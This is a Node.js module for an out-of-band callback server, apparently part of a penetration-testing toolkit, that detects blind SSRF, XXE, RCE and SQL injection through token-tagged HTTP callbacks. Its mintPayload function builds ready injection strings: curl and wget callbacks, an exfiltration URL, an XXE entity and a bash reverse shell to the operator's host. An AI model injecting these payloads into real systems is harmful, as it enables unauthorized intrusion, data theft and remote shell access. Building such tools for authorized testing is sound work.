// ════════════════════════════════════════════════════════════════
//  📡 OOB COLLABORATOR — Out-of-band callback server (interactsh-like)
//  Detecte blind vulns (SSRF, XXE, blind RCE, blind SQLi) via HTTP
//  + DNS callbacks corrélés par token unique. 100% local (sandbox).
// ════════════════════════════════════════════════════════════════
const http = require('http');
const crypto = require('crypto');
const os = require('os');
const fs = require('fs');
const path = require('path');

const EVENTS_DIR = path.join(__dirname, '..', 'data', 'oob');
try { fs.mkdirSync(EVENTS_DIR, { recursive: true }); } catch {}

const DEFAULT_PORT = parseInt(process.env.KEYSOSI_OOB_PORT || process.env.AURA_OOB_PORT || '4444', 10);
const DEFAULT_HOST = process.env.KEYSOSI_OOB_HOST || process.env.AURA_OOB_HOST || _lanIp() || '127.0.0.1';

let _server = null;
let _events = []; // en memoire : [{ id, token, ts, method, url, headers, body, ip }]
let _port = DEFAULT_PORT;
let _host = DEFAULT_HOST;

function _lanIp() {
    try {
        const ifs = os.networkInterfaces();
        for (const name of Object.keys(ifs)) {
            for (const n of ifs[name]) {
                if (!n.internal && n.family === 'IPv4') return n.address;
            }
        }
    } catch {}
    return null;
}

function generateToken() {
    return crypto.randomBytes(8).toString('hex');
}

// URL a injecter dans le payload : http://{host}:{port}/{token}[/extra]
function mintPayload(opts = {}) {
    const token = opts.token || generateToken();
    const base = `http://${_host}:${_port}/${token}`;
    return {
        token,
        http: base,
        httpExfil: `${base}/exfil?d=`, // user concatene donnee encodee
        dns: `${token}.${_host.replace(/\./g, '-')}.oob`, // pseudo-dns (si DNS serveur dispo)
        curl: `curl ${base}`,
        wget: `wget -qO- ${base}`,
        xxe: `<!ENTITY xxe SYSTEM "${base}/xxe">`,
        bashRev: `bash -i >& /dev/tcp/${_host}/${_port} 0>&1`,
    };
}

function _handle(req, res) {
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
        const body = Buffer.concat(chunks).toString('utf8').slice(0, 5000);
        const url = req.url || '/';
        const m = url.match(/^\/([a-f0-9]{8,32})/i);
        const token = m ? m[1] : null;
        const ev = {
            id: crypto.randomBytes(6).toString('hex'),
            token,
            ts: Date.now(),
            method: req.method,
            url,
            headers: req.headers,
            body,
            ip: req.socket.remoteAddress,
        };
        _events.push(ev);
        if (_events.length > 2000) _events = _events.slice(-1500);
        try {
            const p = path.join(EVENTS_DIR, `${ev.id}.json`);
            fs.writeFileSync(p, JSON.stringify(ev));
        } catch {}
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('OK');
    });
    req.on('error', () => {
        try { res.writeHead(500); res.end(); } catch {}
    });
}

async function start(opts = {}) {
    if (_server) return { ok: true, already: true, host: _host, port: _port };
    _port = opts.port || _port;
    _host = opts.host || _host;
    return new Promise((resolve, reject) => {
        const s = http.createServer(_handle);
        s.on('error', reject);
        s.listen(_port, '0.0.0.0', () => {
            _server = s;
            resolve({ ok: true, host: _host, port: _port, baseUrl: `http://${_host}:${_port}` });
        });
    });
}

async function stop() {
    if (!_server) return { ok: true, already: true };
    return new Promise(resolve => {
        _server.close(() => { _server = null; resolve({ ok: true }); });
    });
}

function status() {
    return { running: !!_server, host: _host, port: _port, baseUrl: _server ? `http://${_host}:${_port}` : null, events: _events.length };
}

function events({ token = null, since = 0, limit = 100 } = {}) {
    let out = _events;
    if (token) out = out.filter(e => e.token === token);
    if (since) out = out.filter(e => e.ts > since);
    return out.slice(-limit);
}

// Attend un callback pour token (polling interne)
async function waitForCallback(token, timeoutMs = 60000) {
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
        const hit = _events.find(e => e.token === token);
        if (hit) return { ok: true, event: hit };
        await new Promise(r => setTimeout(r, 500));
    }
    return { ok: false, error: 'timeout' };
}

function clear() { _events = []; return { ok: true }; }

module.exports = { start, stop, status, events, mintPayload, generateToken, waitForCallback, clear };
